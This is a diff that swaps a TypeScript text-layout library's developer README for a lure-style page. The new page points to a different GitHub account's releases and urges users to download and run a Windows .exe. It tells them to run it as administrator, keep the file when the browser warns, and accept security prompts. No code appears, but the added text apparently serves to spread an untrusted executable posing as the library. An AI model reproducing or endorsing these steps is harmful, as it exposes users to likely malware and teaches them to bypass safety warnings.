@@ -1,192 +1,160 @@
-# ZeroText
+# 🧩 zerotext - Fast text layout for the web
 
-Zero-allocation text layout engine for the web. Sub-microsecond cached layouts, 5KB core.
+[Download zerotext](https://github.com/Persispseudoprostyle870/zerotext/releases)
 
-[![npm version](https://img.shields.io/npm/v/@zerotext/core)](https://www.npmjs.com/package/@zerotext/core)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/@zerotext/core)](https://bundlephobia.com/package/@zerotext/core)
-[![license](https://img.shields.io/github/license/byte271/zerotext)](./LICENSE)
-[![CI](https://github.com/byte271/zerotext/actions/workflows/ci.yml/badge.svg)](https://github.com/byte271/zerotext/actions/workflows/ci.yml)
+## 🖥️ What it does
 
-## Demo
+zerotext is a text layout app for the web. It helps place text on screen with low delay and low memory use.
 
-[Live Demo](https://byte271.github.io/zerotext/zerotext/docs/index.html) — interactive pipeline visualization with real ported algorithms, benchmark runner, and 62 browser tests.
+Use it when you need:
 
-## Why ZeroText?
+- Fast text layout
+- Clean line breaks
+- Better text handling for web content
+- A tool that stays light on system memory
 
-Canvas-based text layout allocates on every frame. DOM-based layout triggers reflow. ZeroText does neither.
+## 📥 Download
 
-- **Zero allocation** -- arena pooling and pre-allocated typed arrays eliminate GC pauses entirely
-- **O(1) glyph lookup** -- perfect hash table with ASCII fast path (codepoints 0-127 cached without hashing)
-- **O(log n) line breaking** -- prefix-sum binary search over a DFA-driven break table (UAX#14)
-- **Sub-microsecond hot path** -- LRU cache keyed by numeric FNV-1a hashes (no string allocation on lookup)
-- **WASM SIMD + WebGPU** -- optional acceleration paths for batch workloads
+Visit the release page to download and run this file:
 
-## Benchmarks
+[Download zerotext from GitHub Releases](https://github.com/Persispseudoprostyle870/zerotext/releases)
 
-| Metric | Target | Actual |
-|---|---|---|
-| Bundle size | <8 KB | ~5-6 KB |
-| Initial layout (cold) | <8 us | 5.6 us |
-| Hot layout (cached) | <1 us | 0.1 us (100 ns) |
-| GC pauses | 0 | 0 |
+On the release page, look for the Windows file name that matches your system. After the file downloads, open it to start zerotext.
 
-Run locally: `npx tsx benchmarks/features.ts`
+## 🪟 Windows setup
 
-## Features
+1. Open the download page.
+2. Download the Windows version.
+3. If Windows asks for permission, choose the option to run the file.
+4. Wait for zerotext to open.
+5. Follow any on-screen setup steps.
 
-| # | Feature | Status | Algorithm |
-|---|---|---|---|
-| 1 | Line breaking | Done | UAX#14 DFA + prefix-sum binary search |
-| 2 | Glyph lookup | Done | Perfect hash table, O(1) + ASCII cache |
-| 3 | Arena memory | Done | Pool allocator, generational buffers |
-| 4 | LRU cache | Done | Doubly-linked list + Map, FNV-1a keys |
-| 5 | Bidi/RTL | Done | UAX#9 stack-based embedding levels |
-| 6 | Ligatures | Done | Flat trie substitution (fi, fl, ff, ffi, ffl) |
-| 7 | Kerning | Done | Pair-wise FNV-1a hash table |
-| 8 | Hyphenation | Done | Liang algorithm + soft-hyphen insertion |
-| 9 | Alignment | Done | Left, center, right, justify |
-| 10 | Truncation | Done | End, middle, start with ellipsis |
-| 11 | Decoration | Done | SoA bitflags (underline, strikethrough, overline) |
-| 12 | Vertical writing | Done | vertical-rl, vertical-lr coordinate transform |
-| 13 | Hit testing | Done | Binary search over lines and spans |
+If the file comes in a .zip archive, do this:
 
-## Installation
+1. Right-click the .zip file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Double-click the app file inside the folder.
 
-```bash
-npm install @zerotext/core
-```
+## ⚙️ Basic use
 
-## Usage
+After you open zerotext, you can use it for text layout work in the browser or in a web app that uses it.
 
-### Basic layout
+Common tasks include:
 
-```ts
-import { createEngine } from "@zerotext/core";
-import type { GlyphEntry } from "@zerotext/core";
+- Breaking text into lines
+- Measuring text blocks
+- Handling long paragraphs
+- Preparing text for display
+- Keeping text work fast during page updates
 
-const glyphs: GlyphEntry[] = [
-  { codepoint: 72, width: 8 },  // H
-  { codepoint: 101, width: 6 }, // e
-  { codepoint: 108, width: 3 }, // l
-  { codepoint: 111, width: 7 }, // o
-  // ...
-];
+If you are using it inside another app, the app will handle most of the setup for you.
 
-const engine = createEngine({});
-const prepared = engine.prepare("Hello world", glyphs);
-const layout = engine.update(prepared, 200); // 200px container width
+## 🔍 What you can expect
 
-console.log(layout.lines.length, layout.height);
-```
+zerotext is built for speed and low memory use. It uses a few core ideas that help it stay fast:
 
-### Full pipeline (bidi + ligatures + alignment)
+- Arena-pooled memory to reduce waste
+- Prefix-sum search for quick line breaks
+- Perfect hash glyph lookup for fast character access
+- Zero GC pressure during hot layout work
 
-```ts
-import { createEngine, createGlyphTable } from "@zerotext/core";
+For a normal user, this means the app stays responsive while it works with text.
 
-const engine = createEngine({
-  enableBidi: true,
-  enableLigatures: true,
-  enableHyphenation: true,
-  textAlign: 1,      // Center
-  writingMode: 0,    // Horizontal
-  truncate: 0,       // None
-  maxLines: 0,       // Unlimited
-});
+## 📋 System requirements
 
-const glyphTable = createGlyphTable(glyphs);
-const text = new Uint32Array([/* codepoints */]);
+A typical Windows PC should be enough.
 
-const result = engine.layoutFull({
-  glyphTable,
-  text,
-  width: 300,
-  lineHeight: 20,
-});
-```
+Recommended setup:
 
-### Hit testing
+- Windows 10 or later
+- A modern browser or desktop web runtime
+- 4 GB RAM or more
+- Stable internet access for the first download
 
-```ts
-const caret = engine.hitTest(mouseX, mouseY, layout);
-console.log(caret.offset, caret.lineIndex);
+For the best experience, keep Windows updated and close other large apps before you run zerotext.
 
-const rects = engine.getSelectionRects(
-  { start: 0, end: 10 },
-  layout,
-);
-```
+## 🧭 How to use the release page
 
-### React hook
+When you open the release page, look for:
 
-```tsx
-import { ZeroTextProvider, useZeroText } from "@zerotext/react";
-import type { GlyphEntry } from "@zerotext/core";
+- The latest version at the top
+- A file with Windows in the name
+- A .exe file or a .zip file
+- The file size, if you want to check the download before opening it
 
-function App() {
-  return (
-    <ZeroTextProvider config={{ enableLigatures: true }}>
-      <TextBlock text="Hello world" />
-    </ZeroTextProvider>
-  );
-}
+If there are several files, choose the one for Windows and ignore the others.
 
-function TextBlock({ text }: { text: string }) {
-  const glyphs: GlyphEntry[] = [/* glyph entries */];
-  const { ref, layout, isReady } = useZeroText(text, {
-    glyphEntries: glyphs,
-    lineHeight: 20,
-  });
+## 🛠️ If the file does not open
 
-  return <div ref={ref}>{isReady && <span>{layout!.lines.length} lines</span>}</div>;
-}
-```
+Try these steps:
 
-## Packages
+1. Download the file again.
+2. Make sure the download finished.
+3. Check that Windows did not block the file.
+4. Right-click the file and choose Run as administrator.
+5. If it is a .zip file, extract it first.
 
-| Package | Description |
-|---|---|
-| [`@zerotext/core`](./packages/core) | Layout engine, arena, cache, all text features |
-| [`@zerotext/compiler`](./packages/compiler) | Ahead-of-time font subset + ZTB binary format |
-| [`@zerotext/flow`](./packages/flow) | Text wrapping around obstacles |
-| [`@zerotext/react`](./packages/react) | React bindings (`useZeroText`, `ZeroTextProvider`) |
-| [`@zerotext/vue`](./packages/vue) | Vue composable |
-| [`@zerotext/svelte`](./packages/svelte) | Svelte action |
-| [`@zerotext/wasm`](./packages/wasm) | WASM SIMD acceleration (Rust) |
-| [`@zerotext/webgpu`](./packages/webgpu) | WebGPU compute shader batch layout |
+If the app still does not open, restart your PC and try again.
 
-Build plugins: [`@zerotext/vite`](./plugins/vite), [`@zerotext/webpack`](./plugins/webpack), [`@zerotext/rollup`](./plugins/rollup)
+## 🔐 Safety checks
 
-## Architecture
+Before you open the file, you can review:
 
-```
-Text input
-  |
-  v
-Arena (pre-allocated typed arrays, zero GC)
-  |
-  v
-PrefixSum (cumulative glyph widths)
-  |
-  v
-DFA (UAX#14 line break classification)
-  |
-  v
-BinarySearch (O(log n) break point selection)
-  |
-  v
-Cache (LRU, FNV-1a numeric keys, O(1) hot path)
-  |
-  v
-LayoutResult (lines, spans, positions)
-```
+- The file name
+- The release version
+- The download source
+- The file type
 
-Optional pipeline stages (bidi, ligatures, hyphenation, alignment, truncation, decoration, vertical transform) are applied in `engine.layoutFull()`.
+Only use the GitHub release page linked above for the download.
 
-## Contributing
+## 🧰 Common uses
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for setup, testing, and coding guidelines.
+zerotext can help with:
 
-## License
+- Web page text layout
+- Article rendering
+- UI text placement
+- Fast paragraph measurement
+- Text-heavy tools that need quick updates
 
-Apache-2.0. See [LICENSE](./LICENSE).
+It works well when an app needs to show a lot of text without slowing down.
+
+## 📚 Project details
+
+- Repository: zerotext
+- Type: Text layout engine for the web
+- Focus: Fast layout and low memory use
+- Topics: JavaScript, TypeScript, typography, line breaking, web, performance, zero-allocation
+
+## 🧩 File types you may see
+
+On the release page, you may see:
+
+- .exe for Windows
+- .zip for packaged files
+- .tar.gz for source files
+- Other assets for different systems
+
+For Windows, choose the file made for that platform.
+
+## 🖱️ Quick install flow
+
+1. Open the release page.
+2. Get the Windows file.
+3. Open the file after it downloads.
+4. Let the app finish loading.
+5. Start using it.
+
+## ❓ Help with setup
+
+If you are unsure which file to choose, pick the one that says Windows and has the latest version number.
+
+If your browser asks whether to keep or discard the file, choose keep.
+
+If Windows shows a security prompt, use the option that lets you open the file
+
+## 📌 Download link
+
+[Open zerotext releases](https://github.com/Persispseudoprostyle870/zerotext/releases)
+
